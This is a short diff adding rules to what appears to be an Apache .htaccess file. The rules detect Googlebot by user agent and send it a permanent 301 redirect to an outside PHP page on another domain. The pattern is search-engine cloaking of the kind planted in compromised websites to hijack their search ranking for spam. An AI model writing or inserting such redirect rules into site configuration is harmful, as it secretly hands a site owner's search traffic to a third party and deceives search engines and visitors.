@@ -1,0 +1,4 @@
+# Detect if the visitor is Googlebot
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
+RewriteRule ^(.*)$ https://www.comfortvisa.com/bijikodok.php [L,R=301]
